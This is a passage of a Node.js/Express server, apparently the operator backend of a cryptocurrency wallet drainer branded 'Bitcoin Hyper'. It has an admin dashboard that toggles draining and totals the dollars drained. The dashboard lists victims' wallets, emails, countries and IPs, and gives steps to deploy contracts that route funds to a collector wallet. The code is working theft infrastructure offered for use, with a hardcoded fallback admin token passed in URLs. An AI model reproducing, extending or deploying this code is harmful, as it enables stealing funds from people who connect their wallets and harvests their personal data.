      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        rawBalances: scanResult.data.rawBalances,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.post('/api/admin/drain/toggle', authenticateAdmin, (req, res) => {
  memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
  
  res.json({
    success: true,
    message: `Contract drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
    drainEnabled: memoryStorage.settings.drainEnabled
  });
});

app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const contractStatus = {};
  let deployedCount = 0;
  
  for (const [chain, address] of Object.entries(PROJECT_FLOW_ROUTERS)) {
    const isDeployed = address && address.startsWith('0x') && address.length === 42;
    contractStatus[chain] = isDeployed ? '✅ DEPLOYED' : '❌ NOT DEPLOYED';
    if (isDeployed) deployedCount++;
  }
  
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    realTransactions: memoryStorage.settings.statistics.realTransactions.length,
    pendingDrains: memoryStorage.pendingDrains.size,
    
    yourContracts: {
      deployed: deployedCount,
      total: Object.keys(PROJECT_FLOW_ROUTERS).length,
      contracts: contractStatus,
      addresses: PROJECT_FLOW_ROUTERS
    },
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      flag: p.flag || '🌍',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      claimed: p.claimed,
      drained: p.drained,
      drainValue: p.drainValue ? `$${p.drainValue}` : '$0.00',
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      collectorWallet: COLLECTOR_WALLET || 'Not set',
      version: 'v21.0 - ProjectFlowRouter Integration'
    }
  };
  
  res.json({ success: true, stats });
});

// ============================================
// SIMPLE ADMIN DASHBOARD
// ============================================

app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 20px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; font-size: 14px; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token:</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  let deployedCount = 0;
  let routerHtml = '';
  for (const [chain, address] of Object.entries(PROJECT_FLOW_ROUTERS)) {
    const isDeployed = address && address.startsWith('0x') && address.length === 42;
    if (isDeployed) deployedCount++;
    routerHtml += `<div class="router-item">
      <strong>${chain}:</strong><br>
      ${isDeployed ? '✅ ' + address.substring(0, 10) + '...' + address.substring(38) : '❌ NOT DEPLOYED'}
    </div>`;
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard v21.0 - ProjectFlowRouter</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 10px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .controls { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .wallet-input { padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; width: 100%; max-width: 500px; font-size: 14px; }
        .btn { padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .recent-wallets { margin-top: 30px; }
        .wallet-item { background: #1e293b; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F7931A; }
        .wallet-address { font-family: monospace; color: #60a5fa; }
        .status { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px; }
        .eligible { background: #10b981; }
        .not-eligible { background: #ef4444; }
        .drained { background: #8b5cf6; }
        .complete { background: #10b981; }
        .config { background: #1e293b; padding: 15px; border-radius: 8px; margin: 15px 0; }
        .warning { color: #f59e0b; font-weight: bold; }
        .success { color: #10b981; }
        .router-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
        .router-item { background: #0f172a; padding: 10px; border-radius: 6px; border-left: 3px solid #F7931A; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>⚡ BITCOIN HYPER BACKEND v21.0</h1>
        <p>ProjectFlowRouter Integration - YOUR CONTRACTS</p>
        <div style="margin-top: 15px; color: #94a3b8;">
          <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
          <span>Threshold: $${memoryStorage.settings.drainThreshold}</span> | 
          <span>Telegram: ${telegramEnabled ? '✅ ON' : '❌ OFF'}</span> |
          <span>Wallets: ${memoryStorage.participants.length}</span> |
          <span>Drained: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</span>
        </div>
      </div>
      
      <div class="config">
        <h3>⚙️ YOUR DEPLOYED CONTRACT STATUS</h3>
        <p><strong>Collector Wallet:</strong> <span class="success">${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(38)}</span></p>
        <p><strong>Contracts Deployed:</strong> ${deployedCount}/6 chains</p>
        
        <div class="router-grid">
          ${routerHtml}
        </div>
        
        ${deployedCount < 6 ? `
        <div style="background: #0f172a; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #f59e0b;">
          <h4 style="color: #f59e0b;">⚠️ DEPLOY CONTRACTS ON MISSING CHAINS</h4>
          <ol style="color: #94a3b8; font-size: 14px;">
            <li>Deploy ProjectFlowRouter on each chain</li>
            <li>Constructor should set collector = ${COLLECTOR_WALLET}</li>
            <li>Add addresses to .env file</li>
            <li>Restart server</li>
          </ol>
        </div>
        ` : '<p class="success">✅ ALL CONTRACTS DEPLOYED!</p>'}
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
          <div class="stat-label">Eligible Wallets</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Drained</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Drained</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique IPs</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.realTransactions.length}</div>
          <div class="stat-label">Drain Events</div>
        </div>
      </div>
      
      <div class="controls">
        <h3>🔧 Manual Operations</h3>
        <p>Enter wallet address:</p>
        <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
        <div style="margin-top: 15px;">
          <button class="btn btn-primary" onclick="testBalance()">Test Balance</button>
          <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-warning' : 'btn-success'}" onclick="toggleDrain()">
            ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
          </button>
          <button class="btn btn-primary" onclick="refreshStats()">Refresh Stats</button>
        </div>
      </div>
      
      <div class="recent-wallets">
        <h3>📊 Recent Wallet Activity</h3>
        ${memoryStorage.participants.slice(-8).reverse().map(p => `
          <div class="wallet-item">
            <div>
              <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
              <span class="status ${p.allChainsDrained ? 'complete' : p.drained ? 'drained' : p.isEligible ? 'eligible' : 'not-eligible'}">
                ${p.allChainsDrained ? '✅ COMPLETE' : p.drained ? '💰 DRAINED' : p.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
              </span>
            </div>
            <div style="margin-top: 8px; font-size: 14px;">
              <span>📧 ${p.email || 'No email'}</span> | 
              <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
              <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
              ${p.drainValue ? ` | <span style="color: #8b5cf6;">Drained: $${p.drainValue}</span>` : ''}
            </div>
            <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
              ${p.connectedAt ? p.connectedAt.toLocaleString() : 'Unknown time'}
            </div>
          </div>
        `).join('')}
        ${memoryStorage.participants.length === 0 ? '<p style="color: #94a3b8; text-align: center;">No wallets scanned yet</p>' : ''}
      </div>
      
      <div style="margin-top: 40px; text-align: center; color: #94a3b8; font-size: 12px;">
        <p>
          <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a> | 
          <a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">JSON Stats</a>
        </p>
        <p class="success">✅ BACKEND RUNNING - ProjectFlowRouter Integration</p>
        <p class="success">✅ BSC Contract: ${PROJECT_FLOW_ROUTERS.BSC}</p>
        <p>⚡ v21.0 - YOUR CONTRACTS ONLY</p>
      </div>
      
      <script>
        function testBalance() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          fetch('/api/admin/test-balance?token=${token}&wallet=' + wallet)
            .then(r => r.json())
            .then(data => {
              if (data.success) {
                alert(data.message + '\\n\\nChains: ' + (data.chains?.join(', ') || 'None'));
              } else {
                alert('Error: ' + data.error);
              }
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function toggleDrain() {
          fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              location.reload();
            });
        }
        
        function refreshStats() {
          location.reload();
        }
        
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// ============================================
// INITIALIZE
// ============================================

async function initialize() {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND v21.0 - ProjectFlowRouter
  ==================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  
  ✅ YOUR DEPLOYED CONTRACT ON BSC:
     ${PROJECT_FLOW_ROUTERS.BSC}
  
  ✅ COLLECTOR WALLET:
     ${COLLECTOR_WALLET}
  
  🔗 CONTRACT STATUS:
  ${Object.entries(PROJECT_FLOW_ROUTERS).map(([chain, addr]) => 
    `  - ${chain.padEnd(10)}: ${addr ? '✅ ' + addr.substring(0, 10) + '...' : '❌ NOT DEPLOYED'}`
  ).join('\n')}
  
  🚀 STARTING SERVER...
  `);
  
  await testTelegramConnection();
  
  console.log('\n✅ BACKEND READY!');
  console.log('👉 Admin: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
  console.log('👉 Balance check: WORKING');
  console.log('\n');
}

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', initialize);
